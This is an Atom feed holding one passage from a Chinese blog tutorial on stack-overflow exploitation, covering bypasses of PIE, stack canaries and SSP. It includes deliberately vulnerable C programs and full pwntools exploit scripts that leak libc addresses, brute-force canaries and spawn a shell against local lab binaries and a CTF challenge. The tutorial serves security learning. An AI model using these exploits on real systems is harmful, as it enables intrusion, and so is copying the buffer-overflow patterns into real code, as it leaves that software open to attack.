<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ascotbe</title>
  
  
  <link href="https://www.ascotbe.com/atom.xml" rel="self"/>
  
  <link href="https://www.ascotbe.com/"/>
  <updated>2021-05-04T15:17:43.976Z</updated>
  <id>https://www.ascotbe.com/</id>
  
  <author>
    <name>ascotbe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>栈溢出总结（0x03）</title>
    <link href="https://www.ascotbe.com/2021/03/26/StackOverflow_0x03/"/>
    <id>https://www.ascotbe.com/2021/03/26/StackOverflow_0x03/</id>
    <published>2021-03-26T10:45:42.000Z</published>
    <updated>2021-05-04T15:17:43.976Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>上篇文章真的就是一改就花了一个月时间，然后发现篇幅有点太长了分割一下，感觉这篇也需要好久</p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/27.png?raw=true" alt="image-20210326103216832" style="zoom:50%;" /><blockquote><p>记录</p></blockquote><p>几个未填坑的点</p><ul><li>如何计算出TLS的offset大小（EXP抄的，我也懵</li><li>SSP题目中，为什么当可执行文件足够小的时候，他的不同区段可能会被多次映射？</li></ul><blockquote><h2 id="绕过PIE保护"><a href="#绕过PIE保护" class="headerlink" title="绕过PIE保护"></a>绕过PIE保护</h2></blockquote><p>测试代码（题目泄露地址）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;main);</span><br><span class="line">vuln_func();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译产生修改为<code>-pie -fpie</code>，与<code>-pie -fno-pie</code>不同的是，它不再对程序原始字节码做修改，而是使用了一类  <strong>__x86.get_pc.thunk</strong>函数，通过PC指针来做定位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z noexecstack -pie -fpie test.c -o test2.out</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/28.png?raw=true" alt="image-20210326152720436"></p><p>可以看到call函数的地址变成了上述我们所说的，由于<strong>__x86.get_pc.thunk</strong>的作用将下一条指令的地址赋值给EBX寄存器，然后通过加上一个偏移得到当前进程的GOT表的地址，并以此作为后续的基地址。</p><div class="note info modern"><p>PIE技术的缺陷：我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。</p></div><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/29.png?raw=true" alt="image-20210326153042242"></p><p>知道了这些我们就可以编写EXP了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)<span class="comment">#获取printf输出的main函数地址</span></span><br><span class="line">start_addr = main_addr - elf.sym[<span class="string">&#x27;main&#x27;</span>]<span class="comment">#计算相对偏移</span></span><br><span class="line">vuln_func_addr = start_addr + elf.sym[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line">write_plt = start_addr + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = start_addr + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]main addr: &quot;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line">ebx = start_addr + <span class="number">0x2000</span><span class="comment"># 通过相对偏移加上PIE缺陷所得的地址获取到GOT表的地址</span></span><br><span class="line"><span class="comment">#这边的0X2000的值请看《ctf竞赛权威指南（PWN篇）》这本书的PIE解释</span></span><br><span class="line"><span class="comment">#0x699+0x1967=0x2000，为什么这样加呢？请看上面的PIE技术的缺陷</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">132</span>).encode() + p32(ebx) + <span class="string">b&quot;AAAA&quot;</span> + p32(write_plt) + p32(vuln_func_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)<span class="comment">#根据__x86.get_pc.thunk的特性拼接地址，该特性多了一步call操作</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/30.png?raw=true" alt="image-20210326163537561"></p><blockquote><h2 id="绕过CANNARY保护"><a href="#绕过CANNARY保护" class="headerlink" title="绕过CANNARY保护"></a>绕过CANNARY保护</h2></blockquote><p>保护原理就是在ebp的低地址添加一个随即值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">High           +-----------------+</span><br><span class="line"> |             |      args       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |             | return address  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |     ebp &#x3D;&gt;  |       ebp       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |    ebp-4 &#x3D;&gt; |   canary value  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> V             |     局部变量     |</span><br><span class="line">Low            +-----------------+</span><br></pre></td></tr></table></figure><hr><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下，编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test3</span></span><br></pre></td></tr></table></figure><p>这题只需要利用print函数的信息泄露获取到canary值的地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_shell_func_addr = elf.sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]get shell func addr: &quot;</span> + <span class="built_in">hex</span>(get_shell_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="comment">#利用两次for循环来获取canary_value的值</span></span><br><span class="line"><span class="comment">#第一次利用溢出获取返回的值，由于canary的保护我们不会覆盖到ebp，程序可以进行运行</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()</span><br><span class="line">io.sendline(payload1)<span class="comment">#必须使用带&#x27;\n&#x27;的值进行poc结尾，也就是模拟回车键</span></span><br><span class="line"><span class="comment">#输出带有payload1和canary混合的值，用recvuntil来接收处理</span></span><br><span class="line">recvuntil_value=io.recvuntil(payload1)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">b&quot;[*]recvuntil value: &quot;</span> + recvuntil_value)</span><br><span class="line">canary_value = u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span><span class="comment">#0xa是\n的十六进制值，ASCII表对应</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value: &quot;</span> + <span class="built_in">hex</span>(canary_value))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value add 0xa: &quot;</span> + <span class="built_in">hex</span>(canary_value+<span class="number">0xa</span>))</span><br><span class="line">payload2 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()+p32(canary_value)+(<span class="string">&quot;A&quot;</span>*<span class="number">12</span>).encode()+p32(get_shell_func_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="爆破Canary值"><a href="#爆破Canary值" class="headerlink" title="爆破Canary值"></a>爆破Canary值</h3><p>每次进程重启后的canary不同，且同一个进程中的每个线程的canary也不同。但是如果程序通过fork函数开启子进程交互的话，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的。我们可以利用这样的特点，逐个字节将canary爆破出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">fun();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">wait(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test4</span></span><br><span class="line"><span class="comment">//echo &quot;hello wrod by ascotbe&quot; &gt; flag</span></span><br></pre></td></tr></table></figure><p>可以看到源码里面溢出点是100个字符，并且运行程序如果一直按回车会启动N个进程</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/31.png?raw=true" alt="image-20210401114355036"></p><p>因为canary的 最后的一个字节总是<strong>0x00</strong>（为了截断数据，小端排序），所以只需要爆破剩下的三个字节就可以了，每次尝试一个字节，如果程序顺利执行得到结果<code>welcome\n</code>，否则程序崩溃，通过穷举就能爆破处正确的canary值。64位的话爆破7位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_flag_func_addr = elf.sym[<span class="string">&#x27;getflag&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">test=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        io.send((<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode()+ canary + <span class="built_in">bytes</span>([i]))<span class="comment">#int转换成bytes用这个方法，可以直接转换为16进制的</span></span><br><span class="line">        a = io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;recv&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">            print(<span class="string">b&quot;[*] Blasting out byte :&quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">b&quot;[*] canary is :&quot;</span>+canary)</span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode() + canary+ (<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>).encode() + p32(get_flag_func_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag = io.recv()</span><br><span class="line">io.close()</span><br><span class="line">log.success(<span class="string">&quot;flag is:&quot;</span> + flag.decode())</span><br></pre></td></tr></table></figure><p><del>弱类型语言类型转换真的有点恶心</del></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/32.png?raw=true" alt="image-20210401173411704"></p><h3 id="SSP（Stack-Smashing-Protector-）"><a href="#SSP（Stack-Smashing-Protector-）" class="headerlink" title="SSP（Stack Smashing Protector ）"></a>SSP（Stack Smashing Protector ）</h3><p>利用原理是Canary值被修改然后函数不能正常执行，会<code>call __stack_chk_fail</code>打印**argv[0]**这个指针指向的字符串，默认是程序的名字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们把它覆盖为flag的地址时，它就会把flag给打印出来，注意不要用原来flag的地址覆盖，因为原来存储flag的地址会被overwrite，但是由于ELF的映射方式，此flag会被映射两次，另一个地方的flag的内容不会变，原因是<code>__stack_chk_fail</code>会调用<strong>libc_message</strong></p><p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229">题目地址</a>    <a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/smashes">备用地址</a></p><p>我们使用IDA查看一下代码，可以发现溢出点在下面这段代码中的<code>_IO_getc</code>函数中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  byte_600D20[v0++] = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双击<code>byte_600D20</code>可以看到这样的画面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 ; char byte_600D20[]</span><br><span class="line">.data:0000000000600D20 byte_600D20     db 50h                  ; DATA XREF: sub_4007E0+6E↑w</span><br><span class="line">.data:0000000000600D21 aCtfHereSTheFla db &#39;CTF&#123;Here&#39;,27h,&#39;s the flag on server&#125;&#39;,0</span><br><span class="line">.data:0000000000600D21 _data           ends</span><br></pre></td></tr></table></figure><p>由此可知，服务器端中的 flag 应该也在这个位置上。接下来我们需要下个断点来进入main函数，但是由于程序经过了strip处理，没有debug信息，所以我们需要下断点到<code>__libc_start_main</code>函数才能看到，可以看到RDI的值才是main函数的真正入口</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/33.png?raw=true" alt="image-20210402134315830"></p><p><strong>0x7fffffffe269</strong>指向程序名，其自然就是argv[0]，所以我们修改的内容就是这个地址。<br>同时<strong>0x7fffffffded8</strong>处保留着该地址，所以我们真正需要的地址是<strong>0x7fffffffded8</strong></p><p>接着我们需要找到栈顶到这个argv[0]的偏移，从而方便我们计算出需要填充的字符个数</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/34.png?raw=true" alt="image-20210403203337757"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/35.png?raw=true" alt="image-20210406215300344"></p><p>从图中我们可以知道，我们只需要把断点下到<code>_IO_gets</code>这个函数之前就能获取到argv[0]的偏移，接着可以看到</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/36.png?raw=true" alt="image-20210406215520252"></p><p>地址是<strong>0x40080E</strong>，我们只需要在这个位置下个断点，看RSP的值即可</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/37.png?raw=true" alt="image-20210406220110587"></p><p>所以偏移值为<strong>0x7fffffffded8 - 0x7fffffffdcc0 = 0x218</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span 